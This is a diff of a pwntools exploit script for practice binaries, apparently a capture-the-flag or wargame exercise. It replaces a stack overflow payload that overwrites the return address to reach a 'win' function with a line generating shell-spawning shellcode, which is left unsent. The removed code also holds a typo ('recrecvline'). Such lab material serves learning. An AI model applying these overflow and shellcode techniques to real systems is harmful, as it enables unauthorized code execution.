@@ -2,7 +2,8 @@ from pwn import *
 
 # 1. info
 context.log_level = 'debug'
-e = ELF("../stack3")
+context.arch = 'amd64'
+e = ELF("../stack5")
 """
     Arch:     amd64-64-little
     RELRO:    No RELRO
@@ -13,13 +14,7 @@ e = ELF("../stack3")
 """
 
 # 2. connect
-p = process("../stack3")
+p = process("../stack5")
 
 # 3. exploit
-payload = b'b' * 72 + p64(e.symbols['win'])
-p.sendline(payload)
-
-message = p.recrecvline()
-FLAG = b'code flow successfully changed'
-if FLAG in message:
-    print(FLAG)
+shellcode = asm(shellcraft.sh())
